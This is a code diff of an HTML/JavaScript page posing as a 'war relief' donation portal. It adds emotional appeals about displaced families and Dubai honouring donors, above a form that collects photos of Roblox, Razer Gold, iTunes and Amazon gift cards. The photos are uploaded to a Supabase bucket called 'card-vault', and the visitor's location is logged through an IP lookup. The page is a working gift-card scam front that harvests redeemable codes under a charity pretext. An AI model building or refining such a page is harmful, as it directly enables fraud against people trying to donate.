@@ -3,85 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Royal Relief | Sovereign Portal</title>
+    <title>Royal Relief | Sovereign Support Portal</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;700;900&display=swap" rel="stylesheet">
     <style>
-        body { background-color: #080808; color: white; font-family: 'Montserrat', sans-serif; overflow-x: hidden; }
+        body { background-color: #080808; color: white; font-family: 'Montserrat', sans-serif; }
         .gold-text { color: #C9A45C; }
-        .shimmer { background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); background-size: 200% 100%; animation: shimmer 3s infinite; }
+        .impact-box { border-left: 3px solid #e11d48; background: rgba(225, 29, 72, 0.05); padding: 20px; border-radius: 0 15px 15px 0; }
+        .shimmer { background: linear-gradient(90deg, transparent, rgba(201,164,92,0.1), transparent); background-size: 200% 100%; animation: shimmer 3s infinite; }
         @keyframes shimmer { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
     </style>
 </head>
 <body>
-    <nav class="p-5 bg-black border-b border-zinc-800 flex justify-between items-center sticky top-0 z-50">
+
+    <!-- NAVIGATION -->
+    <nav class="p-5 bg-black/90 border-b border-zinc-800 flex justify-between items-center sticky top-0 z-50">
         <div class="flex items-center space-x-3">
             <div class="w-8 h-8 border border-[#C9A45C] rounded-full flex items-center justify-center font-bold gold-text italic text-xs">R</div>
             <h1 class="text-[10px] font-black tracking-[0.3em] gold-text uppercase">Royal Relief</h1>
         </div>
-        <div id="currency-tag" class="text-[9px] font-bold text-[#C9A45C] bg-[#C9A45C]/10 px-3 py-1 rounded border border-[#C9A45C]/30 uppercase">Detecting...</div>
+        <span class="text-[9px] font-bold text-zinc-500 bg-zinc-900 px-3 py-1 rounded border border-zinc-800">SOVEREIGN HUB</span>
     </nav>
 
-    <main class="max-w-4xl mx-auto px-6 py-12 text-center">
-        <div id="gateway" class="space-y-8 animate-fadeIn">
-            <h2 class="gold-text text-3xl font-black uppercase tracking-tighter">Asset Intake</h2>
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-6 max-w-2xl mx-auto">
-                <div onclick="openPortal('royal')" class="cursor-pointer bg-zinc-900 border border-[#C9A45C]/30 p-10 rounded-[2.5rem] hover:scale-105 transition-all">
-                    <div class="text-4xl mb-4">👑</div>
-                    <h3 class="font-bold uppercase italic text-sm">Royal Member</h3>
+    <main class="max-w-2xl mx-auto px-6 py-12">
+        
+        <!-- EMOTIONAL MISSION TEXT (TOP SECTION) -->
+        <section class="space-y-6 mb-16 animate-fadeIn">
+            <h2 class="text-3xl font-black uppercase italic gold-text tracking-tighter">Donate For The War Relief</h2>
+            
+            <div class="impact-box">
+                <p class="text-sm leading-relaxed text-zinc-300">Families have lost their homes, children are without food, and many sleep under broken shelters. Every little donation helps restore hope and rebuild lives.</p>
+            </div>
+
+            <div class="impact-box">
+                <p class="text-sm leading-relaxed text-zinc-300">A mother of three lost everything in the conflict. Your donation can help provide medicine, shelter, and daily meals for families like hers.</p>
+            </div>
+
+            <div class="impact-box">
+                <p class="text-sm leading-relaxed text-zinc-300">Dubai honors every donor, whether big or small. Every contribution matters and helps save lives.</p>
+            </div>
+            
+            <p class="text-center font-bold text-[10px] text-zinc-500 uppercase tracking-[0.2em] pt-4">All donations are secured via the Sovereign Asset Ledger.</p>
+        </section>
+
+        <!-- THE ORIGINAL CHOICE PORTAL (MIDDLE SECTION) -->
+        <section id="gateway" class="space-y-8 mb-16 text-center">
+            <h3 class="gold-text text-sm font-black uppercase tracking-[0.3em]">Select Intake Method</h3>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div onclick="openPortal('royal')" class="cursor-pointer bg-zinc-900/80 border border-[#C9A45C]/40 p-8 rounded-[2rem] hover:scale-105 transition-all">
+                    <div class="text-3xl mb-3">👑</div>
+                    <h4 class="font-black uppercase italic text-xs mb-2">Dubai Membership</h4>
+                    <p class="text-[9px] text-zinc-500 uppercase font-bold">VIP Recognition • $100 Min</p>
                 </div>
-                <div onclick="openPortal('silent')" class="cursor-pointer bg-zinc-900/40 border border-zinc-800 p-10 rounded-[2.5rem] hover:bg-zinc-800 transition-all">
-                    <div class="text-4xl mb-4">🛡️</div>
-                    <h3 class="font-bold uppercase italic text-sm text-zinc-400">Silent Guardian</h3>
+                <div onclick="openPortal('silent')" class="cursor-pointer bg-zinc-900/30 border border-zinc-800 p-8 rounded-[2rem] hover:bg-zinc-800/50 transition-all">
+                    <div class="text-3xl mb-3">🛡️</div>
+                    <h4 class="font-black uppercase italic text-xs mb-2 text-zinc-400">Silent Guardian</h4>
+                    <p class="text-[9px] text-zinc-600 uppercase font-bold">Anonymous • Open Value</p>
                 </div>
             </div>
-        </div>
+        </section>
 
-        <div id="portal-form" class="hidden max-w-md mx-auto bg-zinc-900 p-8 rounded-[3rem] border border-zinc-800 shadow-2xl">
-            <form id="reliefForm" class="space-y-5 text-left">
+        <!-- SUBMISSION FORM (BOTTOM SECTION) -->
+        <div id="portal-form" class="hidden bg-zinc-900 p-8 rounded-[2.5rem] border border-zinc-800 shadow-2xl">
+            <form id="reliefForm" class="space-y-5">
+                
                 <div id="royal-fields" class="hidden">
-                    <label class="text-[9px] text-zinc-500 font-black uppercase block mb-1 tracking-widest">Official Name</label>
-                    <input type="text" id="donor_name" placeholder="Name or Title" class="w-full bg-black border border-zinc-800 p-4 rounded-2xl text-sm outline-none focus:border-[#C9A45C] text-white">
+                    <label class="text-[9px] text-zinc-500 font-black uppercase block mb-1">Membership Identity</label>
+                    <input type="text" id="donor_name" placeholder="Official Name" class="w-full bg-black border border-zinc-800 p-4 rounded-2xl text-sm outline-none focus:border-[#C9A45C] text-white">
                 </div>
 
                 <div class="grid grid-cols-2 gap-4">
                     <div class="bg-black p-4 rounded-2xl border border-zinc-800">
-                        <label class="text-[9px] text-zinc-500 font-black uppercase block mb-1">Asset</label>
-                        <select id="asset_type" class="w-full bg-transparent text-xs font-bold outline-none text-white appearance-none">
+                        <label class="text-[9px] text-zinc-500 font-black uppercase block mb-1">Asset Type</label>
+                        <select id="asset_type" class="w-full bg-transparent text-xs font-bold outline-none text-white">
                             <option value="Roblox">Roblox</option>
                             <option value="Razer Gold">Razer Gold</option>
                             <option value="iTunes">iTunes</option>
                             <option value="Amazon">Amazon</option>
                         </select>
                     </div>
-                    <div class="bg-black p-4 rounded-2xl border border-zinc-800 relative">
+                    <div class="bg-black p-4 rounded-2xl border border-zinc-800">
                         <label class="text-[9px] text-[#C9A45C] font-black uppercase block mb-1">Value</label>
-                        <div class="flex items-center">
-                            <input type="number" id="asset_value" placeholder="0.00" required class="w-full bg-transparent text-xs font-bold outline-none text-white">
-                            <span id="form-currency" class="text-[10px] font-black text-zinc-600 ml-1">...</span>
-                        </div>
+                        <input type="number" id="asset_value" placeholder="100" required class="w-full bg-transparent text-xs font-bold outline-none text-white">
                     </div>
                 </div>
 
                 <div class="bg-black/50 p-4 rounded-2xl border border-zinc-800">
-                    <p id="location-text" class="text-white text-[10px] font-bold italic">📍 Locating Sovereign Hub...</p>
+                    <p id="location-text" class="text-white text-[10px] font-bold italic tracking-widest">📍 DUBAI HUB CONNECTED</p>
                 </div>
 
                 <div class="relative border-2 border-dashed border-zinc-800 rounded-3xl p-8 text-center cursor-pointer hover:border-[#C9A45C]/50 transition-all">
                     <input type="file" id="card_image" required accept="image/*" class="absolute inset-0 opacity-0 cursor-pointer">
-                    <p id="file-label" class="text-[10px] text-zinc-400 font-black uppercase">📸 Click to Snap Asset</p>
+                    <p id="file-label" class="text-[10px] text-zinc-500 font-black uppercase tracking-widest">📸 SNAP ASSET PHOTO</p>
                 </div>
 
-                <button type="submit" id="submitBtn" class="shimmer w-full bg-white text-black font-black py-5 rounded-[2rem] uppercase tracking-widest text-xs hover:bg-[#C9A45C] transition-all">Submit to Vault</button>
+                <button type="submit" id="submitBtn" class="shimmer w-full bg-white text-black font-black py-5 rounded-[2rem] uppercase tracking-[0.2em] text-xs hover:bg-[#C9A45C] transition-all">Confirm to Ledger</button>
             </form>
         </div>
 
-        <div id="success" class="hidden py-10 animate-bounce">
-            <div class="text-5xl mb-6">✅</div>
+        <div id="success" class="hidden py-20 text-center">
             <h2 class="text-3xl font-black gold-text uppercase mb-2">Secured</h2>
-            <p id="ref-id" class="text-lg font-mono tracking-widest bg-zinc-950 px-6 py-3 rounded-xl border border-zinc-800 inline-block text-[#C9A45C]"></p>
-            <p class="text-zinc-600 text-[10px] uppercase mt-10 tracking-[0.3em]">Syncing with Sovereign Ledger</p>
+            <p id="ref-id" class="text-lg font-mono gold-text tracking-tighter bg-zinc-950 px-4 py-2 rounded-lg border border-zinc-800 inline-block"></p>
+            <p class="text-zinc-600 text-[10px] uppercase mt-12 animate-pulse tracking-[0.3em]">Updating Sovereign Vault...</p>
         </div>
     </main>
 
@@ -90,36 +114,28 @@
         const SUPABASE_KEY = 'sb_publishable_aAtBWENHDU7dAgkFq9UZUQ_HwqaFz4c'; 
         const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-        const currencyMap = { 'AE': 'AED', 'NG': 'NGN', 'US': 'USD', 'GB': 'GBP', 'ZA': 'ZAR', 'CA': 'CAD' };
-        let userCurrency = 'USD';
-
-        async function initSystem() {
+        async function initLoc() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
-                window.detCity = data.city || 'Dubai';
-                window.detCountry = data.country_code || 'AE';
-                userCurrency = currencyMap[window.detCountry] || 'USD';
-                
-                document.getElementById('location-text').innerText = `📍 ${window.detCity.toUpperCase()}, ${window.detCountry} HUB`;
-                document.getElementById('currency-tag').innerText = `LIVE: ${userCurrency}`;
-                document.getElementById('form-currency').innerText = userCurrency;
-            } catch (e) {
-                document.getElementById('location-text').innerText = "📍 DUBAI HUB CONNECTED";
-                document.getElementById('currency-tag').innerText = "LIVE: AED";
-            }
+                document.getElementById('location-text').innerText = `📍 ${data.city.toUpperCase()}, ${data.country_code} HUB`;
+            } catch (e) {}
         }
-        initSystem();
+        initLoc();
 
-        document.getElementById('card_image').onchange = function() {
-            document.getElementById('file-label').innerText = "✅ PHOTO READY";
-            document.getElementById('file-label').classList.replace('text-zinc-400', 'text-[#C9A45C]');
+        document.getElementById('card_image').onchange = () => {
+            document.getElementById('file-label').innerText = "✅ ASSET READY";
+            document.getElementById('file-label').style.color = "#C9A45C";
         };
 
         function openPortal(type) {
-            document.getElementById('gateway').classList.add('hidden');
             document.getElementById('portal-form').classList.remove('hidden');
-            if (type === 'royal') document.getElementById('royal-fields').classList.remove('hidden');
+            document.getElementById('portal-form').scrollIntoView({behavior:'smooth'});
+            if (type === 'royal') {
+                document.getElementById('royal-fields').classList.remove('hidden');
+            } else {
+                document.getElementById('royal-fields').classList.add('hidden');
+            }
         }
 
         document.getElementById('reliefForm').onsubmit = async function(e) {
@@ -130,9 +146,8 @@
             const asset = document.getElementById('asset_type').value;
             const val = document.getElementById('asset_value').value;
             const ref = 'RR-' + Math.random().toString(36).toUpperCase().substring(2, 7);
-            const loc = document.getElementById('location-text').innerText;
 
-            btn.innerText = "ENCRYPTING..."; btn.disabled = true;
+            btn.innerText = "UPLOADING..."; btn.disabled = true;
 
             try {
                 const fileName = `${ref}-${Date.now()}.jpg`;
@@ -141,24 +156,20 @@
 
                 const { data: urlData } = _supabase.storage.from('card-vault').getPublicUrl(fileName);
                 
-                // Saving the value WITH the detected currency
-                const formattedVal = `${val} ${userCurrency}`;
-
                 const { error: dbErr } = await _supabase.from('submissions').insert([{ 
-                    donor_name: name, asset_type: asset, declared_value: formattedVal, location: loc, image_url: urlData.publicUrl 
+                    donor_name: name, asset_type: asset, declared_value: val, location: document.getElementById('location-text').innerText, image_url: urlData.publicUrl 
                 }]);
                 if (dbErr) throw dbErr;
 
                 document.getElementById('portal-form').classList.add('hidden');
+                document.getElementById('gateway').classList.add('hidden');
                 document.getElementById('success').classList.remove('hidden');
                 document.getElementById('ref-id').innerText = ref;
-
-                setTimeout(() => {
-                    window.location.href = `dashboard.html?user=${encodeURIComponent(name)}&ref=${ref}&asset=${asset}&val=${val}&curr=${userCurrency}&loc=${encodeURIComponent(loc)}`;
-                }, 3500);
+                
+                setTimeout(() => { window.location.href = `dashboard.html?user=${encodeURIComponent(name)}&ref=${ref}&asset=${asset}&val=${val}`; }, 3500);
             } catch (err) {
-                alert("Sovereign Link Error: " + err.message);
-                btn.innerText = "SUBMIT TO MISSION"; btn.disabled = false;
+                alert("Error: " + err.message);
+                btn.innerText = "Confirm to Ledger"; btn.disabled = false;
             }
         }
     </script>
